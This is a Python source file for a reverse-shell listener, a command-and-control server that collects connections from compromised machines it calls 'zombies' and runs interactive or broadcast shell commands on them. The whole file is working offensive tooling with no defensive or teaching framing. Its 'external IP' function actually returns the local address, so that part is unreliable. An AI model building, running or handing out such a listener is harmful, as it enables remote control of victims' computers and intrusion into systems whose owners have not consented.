import socket
import threading
import queue
import signal
import sys
import time
import os
import binascii
from colorama import Fore, Style, init
from prettytable import PrettyTable

# Initialize colorama
init(autoreset=True)

# Function to find a free port
def find_free_port(host, start_port, end_port):
    for port in range(start_port, end_port + 1):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                result = s.connect_ex((host, port))  # Try connecting to the port
                if result != 0:  # If the result is non-zero, port is free
                    return port
        except Exception as e:
            print(f"{Fore.RED}[!] Error checking port {port}: {e}")
    return None  # No free port found


class ReverseShellListener:
    def __init__(self):
        self.host = self.get_local_ip()
        self.port = None  # Will be determined automatically
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.zombies = []
        self.zombie_lock = threading.Lock()
        self.shutdown_flag = False
        self.external_ip = self.get_external_ip()

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

    def start(self):
        try:
            # Automatically find a free port
            print(f"{Fore.YELLOW}[INFO] Scanning for a free port...")
            self.port = find_free_port(self.host, 8080, 8090)  # Adjust the range if needed
            if self.port is None:
                print(f"{Fore.RED}[!] No free port found in the given range.")
                return
            self.server.bind((self.host, self.port))
            self.server.listen(5)
            print(f"{Fore.GREEN}[+] Listening on {self.host}:{self.port}")

            accept_thread = threading.Thread(target=self.accept_connections, daemon=True)
            accept_thread.start()

            self.main_menu()

        except Exception as e:
            print(f"{Fore.RED}[!] Error starting listener: {e}")
        finally:
            self.cleanup()

    def get_local_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0)
        try:
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
        except Exception:
            local_ip = "0.0.0.0"
        finally:
            s.close()
        return local_ip
    
    def get_external_ip(self):
        try:
            # Use a reliable external service to get the public IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))  # Google's public DNS server
            external_ip = s.getsockname()[0]
            s.close()
            return external_ip
        except Exception:
            return "Could not determine external IP"

    def accept_connections(self):
        while not self.shutdown_flag:
            try:
                client_sock, addr = self.server.accept()
                client_addr = f"{addr[0]}:{addr[1]}"

                with self.zombie_lock:
                    zombie_id = len(self.zombies) + 1
                    zombie = {
                        "id": zombie_id,
                        "socket": client_sock,
                        "address": client_addr,
                        "thread": None,
                        "queue": queue.Queue(),
                        "active": True
                    }
                    self.zombies.append(zombie)

                print(f"{Fore.GREEN}[+] New zombie connected: #{zombie_id} [{client_addr}]")

                handler = threading.Thread(
                    target=self.handle_zombie,
                    args=(zombie,),
                    daemon=True
                )
                handler.start()
                zombie["thread"] = handler

            except Exception as e:
                if not self.shutdown_flag:
                    print(f"{Fore.RED}[!] Accept error: {e}")

    def handle_zombie(self, zombie):
        try:
            while zombie["active"] and not self.shutdown_flag:
                try:
                    cmd = zombie["queue"].get_nowait()
                    if cmd == "disconnect":
                        zombie["active"] = False
                        break

                    zombie["socket"].sendall(cmd.encode("utf-8") + b"\r\n")
                    response = self.receive_from_zombie(zombie["socket"])
                    print(response)

                    zombie["queue"].task_done()

                except queue.Empty:
                    time.sleep(0.1)

        except Exception as e:
            print(f"{Fore.RED}[!] Error handling zombie #{zombie['id']}: {e}")
        finally:
            self.disconnect_zombie(zombie)

    def receive_from_zombie(self, sock):
        buffer_size = 4096
        data = b""
        try:
            while True:
                chunk = sock.recv(buffer_size)
                if not chunk:
                    break
                data += chunk
                if b"$ " in chunk or b"> " in chunk:
                    break
        except Exception as e:
            print(f"{Fore.RED}[!] Receive error: {e}")

        try:
            return data.decode("utf-8", errors="replace")
        except Exception:
            return binascii.hexlify(data).decode("utf-8")

    def disconnect_zombie(self, zombie):
        try:
            zombie["socket"].shutdown(socket.SHUT_RDWR)
            zombie["socket"].close()
        except Exception:
            pass

        with self.zombie_lock:
            if zombie in self.zombies:
                print(f"{Fore.RED}[-] Disconnected zombie #{zombie['id']} [{zombie['address']}]")
                self.zombies.remove(zombie)

    def main_menu(self):
        while not self.shutdown_flag:
            os.system("cls" if sys.platform == "win32" else "clear")

            # Print listening information at the top of the menu
            print(f"{Fore.CYAN}--- Reverse Shell Listener ---")
            print(f"{Fore.GREEN}[+] Listening on {self.external_ip}:{self.port}")  # Use external IP here
            print(f"{Fore.CYAN}--- Main Menu ---")

            print(f"{Fore.YELLOW}1.{Style.BRIGHT} List zombies")
            print(f"{Fore.YELLOW}2.{Style.BRIGHT} Interact with a zombie")
            print(f"{Fore.YELLOW}3.{Style.BRIGHT} Send command to all zombies")
            print(f"{Fore.YELLOW}4.{Style.BRIGHT} Disconnect a zombie")
            print(f"{Fore.YELLOW}5.{Style.BRIGHT} Exit")

            choice = input(f"{Fore.GREEN}\nEnter option: ").strip()

            if choice == "1":
                self.list_zombies()
            elif choice == "2":
                self.interact_with_zombie()
            elif choice == "3":
                self.broadcast_command()
            elif choice == "4":
                self.disconnect_selected_zombie()
            elif choice == "5":
                self.shutdown_flag = True
                print(f"{Fore.RED}\nExiting... Please wait for clean shutdown.")
                break  # Exit the loop to terminate the program
            else:
                print(f"{Fore.RED}[!] Invalid option")

    def list_zombies(self):
        print(f"\n{Fore.CYAN}--- Connected Zombies ---")
        with self.zombie_lock:
            if not self.zombies:
                print(f"{Fore.RED}No active zombies")
            else:
                table = PrettyTable()
                table.field_names = ["Zombie ID", "Status", "Address"]
                for zombie in self.zombies:
                    status = f"{Fore.GREEN}ACTIVE" if zombie["active"] else f"{Fore.RED}DISCONNECTED"
                    table.add_row([zombie["id"], status, zombie["address"]])
                print(table)

        time.sleep(1)  # Allow the screen to refresh and show updates

    def interact_with_zombie(self):
        try:
            zombie_id = int(input(f"\n{Fore.YELLOW}Enter zombie ID to interact with: "))
            with self.zombie_lock:
                for zombie in self.zombies:
                    if zombie["id"] == zombie_id:
                        if not zombie["active"]:
                            print(f"{Fore.RED}[!] This zombie is inactive")
                            return

                        print(f"\n{Fore.GREEN}Interacting with zombie #{zombie_id}")
                        print(f"{Fore.YELLOW}Type 'back' to return to main menu")

                        while not self.shutdown_flag and zombie["active"]:
                            cmd = input(f"\nZombie#{zombie_id}> ").strip()
                            if not cmd:
                                continue
                            if cmd.lower() == "back":
                                break
                            zombie["queue"].put(cmd)
                            zombie["queue"].join()
                        break
                else:
                    print(f"{Fore.RED}[!] Zombie not found")

        except ValueError:
            print(f"{Fore.RED}[!] Please enter a valid number")

    def broadcast_command(self):
        cmd = input(f"\n{Fore.YELLOW}Enter command to broadcast: ").strip()
        if not cmd:
            print(f"{Fore.RED}[!] Empty command")
            return

        with self.zombie_lock:
            for zombie in self.zombies:
                if zombie["active"]:
                    zombie["queue"].put(cmd)
                    print(f"{Fore.GREEN}Sent to zombie #{zombie['id']}")

    def disconnect_selected_zombie(self):
        try:
            zombie_id = int(input(f"\n{Fore.YELLOW}Enter zombie ID to disconnect: "))
            with self.zombie_lock:
                for zombie in self.zombies:
                    if zombie["id"] == zombie_id:
                        if zombie["active"]:
                            print(f"{Fore.RED}Disconnecting zombie #{zombie_id}...")
                            zombie["queue"].put("disconnect")
                            zombie["queue"].join()
                        else:
                            print(f"{Fore.RED}Zombie #{zombie_id} is already disconnected")
                        return
            print(f"{Fore.RED}[!] Zombie not found")

        except ValueError:
            print(f"{Fore.RED}[!] Please enter a valid number")

    def cleanup(self):
        print(f"\n{Fore.YELLOW}Cleaning up...")
        self.shutdown_flag = True

        with self.zombie_lock:
            for zombie in self.zombies:
                if zombie["active"]:
                    try:
                        zombie["queue"].put("disconnect")
                        zombie["queue"].join()
                    except Exception:
                        pass

        try:
            self.server.shutdown(socket.SHUT_RDWR)
            self.server.close()
        except Exception:
            pass

        print(f"{Fore.YELLOW}Cleanup complete")

    def signal_handler(self, signum, frame):
        print(f"\n{Fore.RED}Received signal {signum}, shutting down...")
        self.shutdown_flag = True


if __name__ == "__main__":
    listener = ReverseShellListener()
    listener.start()
